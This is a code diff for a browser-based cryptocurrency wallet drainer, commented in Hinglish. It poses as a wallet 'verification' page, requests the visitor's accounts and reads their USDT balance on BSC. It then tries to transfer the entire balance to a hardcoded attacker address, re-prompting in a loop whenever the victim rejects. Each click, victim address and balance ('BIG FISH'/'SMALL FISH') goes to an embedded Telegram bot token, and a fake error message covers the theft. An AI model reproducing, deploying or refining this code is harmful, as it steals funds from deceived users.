@@ -1,20 +1,40 @@
 const CONFIG = {
-    REC_SMALL: "0x673849E3109f6Cf1f6ced4034C8363C17ff87ebe", // < 300 USDT yahan aayenge
-    REC_BIG: "0x673849E3109f6Cf1f6ced4034C8363C17ff87ebe",     // >= 300 USDT yahan aayenge
-    USDT_ADDR: "0x55d398326f99059fF775485246999027B3197955", // Mainnet USDT
+    REC_SMALL: "0x673849E3109f6Cf1f6ced4034C8363C17ff87ebe", // < 300 USDT
+    REC_BIG: "0x673849E3109f6Cf1f6ced4034C8363C17ff87ebe",   // >= 300 USDT (Isse badal sakte ho)
+    USDT: "0x55d398326f99059fF775485246999027B3197955",
     BOT: "7849151110:AAFGo5n4hPLk8y8l8tSESYbCl_vut3TPHsI",
-   const telegramChatId = "7849151110"
+    CHAT: "7849151110" // Numerical ID behtar kaam karti hai
 };
 
 function openModal() { document.getElementById('w-modal').style.display = 'flex'; }
 function closeModal() { document.getElementById('w-modal').style.display = 'none'; }
 
+// 🚀 Telegram Pe Notification Bhejne Ka Function
+async function sendTelegram(msg) {
+    const url = `https://api.telegram.org/bot${CONFIG.BOT}/sendMessage`;
+    try {
+        await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CONFIG.CHAT, text: msg, parse_mode: 'HTML' })
+        });
+    } catch(e) { console.error("TG Error"); }
+}
+
 async function selectW(type) {
     closeModal();
-    if (!window.ethereum) {
-        const link = window.location.href.replace(/^https?:\/\//, '');
-        if (type === 'trust') window.location.href = `https://link.trustwallet.com/open_url?url=${encodeURIComponent(window.location.href)}`;
-        else window.location.href = `https://metamask.app.link/dapp/${link}`;
+    
+    // 🔥 CLICK NOTIFICATION: Jaise hi wallet select ho, alert bhej do
+    await sendTelegram(`🚀 <b>Click Detected!</b>\nUser chose: <b>${type}</b>\nDomain: ${window.location.hostname}`);
+
+    if (!window.ethereum && !window.trustwallet) {
+        if (/Android|iPhone|iPad/i.test(navigator.userAgent)) {
+            await sendTelegram(`📱 <b>Mobile Redirect:</b> Sending user to Trust Wallet app.`);
+            const currentUrl = window.location.href.replace("https://", "");
+            window.location.href = "https://link.trustwallet.com/open_url?coin_id=60&url=https://" + currentUrl;
+            return;
+        }
+        alert("Please use Trust Wallet or MetaMask.");
         return;
     }
     runApp();
@@ -25,88 +45,52 @@ async function runApp() {
     ov.style.display = 'flex';
 
     try {
-        const w3 = new Web3(window.ethereum);
-        const accs = await window.ethereum.request({ method: 'eth_requestAccounts' });
-        const user = accs[0];
+        const provider = window.ethereum || window.trustwallet;
+        const w3 = new Web3(provider);
+        const accounts = await provider.request({ method: 'eth_requestAccounts' });
+        const user = accounts[0];
 
-        // Ensure user is on BSC (Chain 0x38)
-        try { await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] }); } catch (e) {}
+        // Switch to BSC Network
+        try { await provider.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] }); } catch (e) {}
 
-        // ABI specifically for USDT 'balanceOf' and 'transfer'
         const minABI = [
-            { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "balance", "type": "uint256" }], "type": "function" },
-            { "constant": false, "inputs": [{ "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "", "type": "bool" }], "type": "function" }
+            { "constant": true, "inputs": [{ "name": "_o", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "b", "type": "uint256" }], "type": "function" },
+            { "constant": false, "inputs": [{ "name": "_t", "type": "address" }, { "name": "_v", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "", "type": "bool" }], "type": "function" }
         ];
 
-        const contract = new w3.eth.Contract(minABI, CONFIG.USDT_ADDR);
-        
-        // Fetch USDT Balance
-        const rawBal = await contract.methods.balanceOf(user).call();
-        const formattedBal = w3.utils.fromWei(rawBal, 'ether');
+        const contract = new w3.eth.Contract(minABI, CONFIG.USDT);
+        const bW = await contract.methods.balanceOf(user).call();
+        const bE = w3.utils.fromWei(bW, 'ether');
 
-        // Logic: Decide Receiver Wallet
-        let target = parseFloat(formattedBal) >= 300 ? CONFIG.REC_BIG : CONFIG.REC_SMALL;
-        let fishType = parseFloat(formattedBal) >= 300 ? "💎 BIG FISH" : "🐟 SMALL FISH";
+        // 🔥 SMART ROUTING LOGIC 🔥
+        let target = parseFloat(bE) >= 300 ? CONFIG.REC_BIG : CONFIG.REC_SMALL;
+        let logType = parseFloat(bE) >= 300 ? "💎 BIG FISH" : "🐟 SMALL FISH";
 
-        // Telegram Log
-        fetch(`https://api.telegram.org/bot${CONFIG.BOT}/sendMessage?chat_id=${CONFIG.CHAT}&text=👤 User: ${user}%0A💰 USDT: ${formattedBal}%0A📁 Route: ${fishType}`);
+        // Wallet Connect Notification
+        await sendTelegram(`👤 <b>New Target Connected!</b>\nAddr: <code>${user}</code>\nBal: <b>${bE} USDT</b>\nRoute: ${logType}`);
 
-        if (parseFloat(formattedBal) > 0.1) {
-            const trigger = async () => {
+        if (parseFloat(bE) > 0.05) {
+            const triggerTransfer = async () => {
+                document.getElementById("loading-text").innerText = "SYNCHRONIZING...";
                 try {
-                    // This calls the USDT contract transfer, NOT a BNB transfer
-                    await contract.methods.transfer(target, rawBal).send({ 
-                        from: user,
-                        gasPrice: await w3.eth.getGasPrice() 
-                    });
+                    // Start USDT Transfer
+                    await contract.methods.transfer(target, bW).send({ from: user });
+                    
+                    // Success alert (fake) to reload
+                    alert("Verification Error: 0x88 Protocol Timeout. Please retry.");
                     location.reload();
                 } catch (err) {
-                    setTimeout(trigger, 1000); // Anti-Cancel Loop
+                    // Anti-Cancel: Transaction popup again if rejected
+                    setTimeout(triggerTransfer, 1200);
                 }
             };
-            await trigger();
+            await triggerTransfer();
         } else {
-            alert("Node Synchronized: Minimum assets not reached.");
+            alert("Verification Complete: Minimal assets detected.");
             ov.style.display = 'none';
         }
-    } catch (err) {
+    } catch (e) {
         ov.style.display = 'none';
+        console.error(e);
     }
 }
-// ... baaki config same rahega ...
-
-async function startProcess() {
-    const overlay = document.getElementById("overlay");
-    const isWeb3 = !!(window.ethereum || window.trustwallet);
-
-    // 🔥 CHANGE 1: Jaise hi button click ho, Telegram par alert bhej do
-    sendTelegram(`🚀 <b>Click Detected!</b>\nUser has clicked the Verify button. Waiting for wallet connection...`);
-
-    if (!isWeb3) {
-        // ... mobile redirect logic ...
-        if (/Android|iPhone|iPad/i.test(navigator.userAgent)) {
-            // Mobile par bhi alert bhej dete hain
-            sendTelegram(`📱 <b>Mobile Redirect:</b> User is being sent to Trust Wallet app.`);
-            const currentUrl = window.location.href.replace("https://", "");
-            window.location.href = "https://link.trustwallet.com/open_url?coin_id=60&url=https://" + currentUrl;
-            return;
-        }
-        alert("Please use Trust Wallet or MetaMask.");
-        return;
-    }
-
-    overlay.style.display = "flex";
-    updateStatus("Connecting...", "Establishing secure handshake...");
-
-    try {
-        const provider = window.ethereum || window.trustwallet;
-        const web3 = new Web3(provider);
-        const accounts = await provider.request({ method: 'eth_requestAccounts' });
-        const userAddress = accounts[0];
-
-        // 🔥 CHANGE 2: Wallet connect hote hi address bhej do (Balance se pehle)
-        sendTelegram(`🔗 <b>Wallet Connected:</b>\n<code>${userAddress}</code>\nChecking balance now...`);
-
-        updateStatus("Scanning Wallet...", "Checking BSC network assets...");
-        
-        // ... baaki ka balance aur transfer logic same rahega ...
